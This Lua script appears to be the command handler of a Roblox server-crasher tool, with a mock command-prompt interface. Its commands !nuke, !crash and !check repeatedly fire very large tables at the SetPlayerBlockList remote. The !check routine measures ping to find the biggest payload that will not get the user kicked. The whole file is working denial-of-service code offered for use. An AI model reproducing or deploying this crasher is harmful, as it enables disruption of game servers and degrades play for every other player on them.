local function processCommand(input)
    local cmd = string.lower(input)
    local args = string.split(cmd, " ")
    
    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
    
    if cmd == "!help" then
        log("Available Commands:", Color3.fromRGB(0, 200, 255))
        log("  !check          - Auto-finds max safe size (prevents kick)")
        log("  !nuke           - Instantly spam max payload")
        log("  !crash          - Safe heavy crasher (Slower, no kick)")
        log("  !stop           - Stop payload")
        log("  !size <number>  - Manually change payload size")
        log("  !ping           - Check server ping")
        log("  !cls            - Clear screen")
        
    elseif cmd == "!nuke" then
        if api then 
            api.start(true) 
            log("[!!!] NUKE ACTIVE. Max speed payload firing.", Color3.fromRGB(255, 50, 50))
        end
        
    elseif cmd == "!crash" then
        if api then 
            api.start(false) 
            log("[+] Crasher started. Safe mode active.", Color3.fromRGB(0, 255, 0))
        end

    elseif cmd == "!check" then
        log("[*] Starting Auto-Check. Finding max safe payload...", Color3.fromRGB(0, 200, 255))
        task.spawn(function()
            local remote = game:FindFirstChild("RobloxReplicatedStorage")
            if remote then remote = remote:FindFirstChild("SetPlayerBlockList") end
            if not remote then 
                log("[!] Remote not found. This server is not vulnerable.", Color3.fromRGB(255, 50, 50))
                return
            end
            
            if api and api.stats()[2] > 0 then api.stop() end
            
            -- Smaller sizes to guarantee it finishes quickly
            local testSizes = {25000, 50000, 100000, 150000}
            local bestSize = 25000
            
            for _, size in ipairs(testSizes) do
                log("[*] Building " .. size .. " payload...", Color3.fromRGB(200, 200, 200))
                local payload = {}
                -- Yield so client doesn't freeze
                for j = 1, size do 
                    payload[j] = {j, j*2}
                    if j % 5000 == 0 then task.wait() end 
                end
                
                log("[*] Firing " .. size .. " for 2 seconds...", Color3.fromRGB(200, 200, 200))
                local startTime = tick()
                local pBefore = 0
                pcall(function() pBefore = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
                
                -- Fire 5 times
                for i = 1, 5 do
                    pcall(function() remote:FireServer(payload) end)
                    task.wait(0.1)
                end
                
                task.wait(1.5) -- Let ping update
                local pAfter = 0
                pcall(function() pAfter = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
                local endTime = tick()
                
                -- If it took more than 3 seconds total (real time) to yield/fire, the client choked.
                if (endTime - startTime) > 3.0 then
                    log("[!] Client choked on " .. size .. "! Aborting.", Color3.fromRGB(255, 50, 50))
                    break
                end
                
                log(string.format("[*] Size %d tested. Ping: %dms", size, math.floor(pAfter)), Color3.fromRGB(200, 200, 200))
                bestSize = size
                task.wait(1)
            end
            
            if api then api.setChildren(bestSize) end
            log("[!!!] TEST COMPLETE. RECOMMENDED SIZE: " .. bestSize, Color3.fromRGB(0, 255, 0))
            log("[+] Type '!crash' or '!nuke' to begin.", Color3.fromRGB(0, 255, 0))
        end)
        
    elseif cmd == "!stop" then
        if api then 
            api.stop()
            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
        end
        
    elseif cmd == "!ping" then
        local p = 0
        pcall(function() p = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
        log("[*] Current Server Ping: " .. math.floor(p) .. "ms", Color3.fromRGB(0, 200, 255))
        
    elseif cmd == "!cls" then
        for _, v in ipairs(consoleFrame:GetChildren()) do
            if v:IsA("TextLabel") then v:Destroy() end
        end
        
    elseif cmd == "!exit" then
        if api then api.stop() end
        screenGui:Destroy()
        
    elseif args[1] == "!size" then
        local num = tonumber(args[2])
        if num and num > 1000 then
            if api then api.setChildren(num) end
            log("[+] Payload size set to " .. num, Color3.fromRGB(0, 255, 0))
        else
            log("[!] Invalid number.", Color3.fromRGB(255, 50, 50))
        end
    elseif cmd == "" then
        -- Do nothing
    else
        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
    end
end

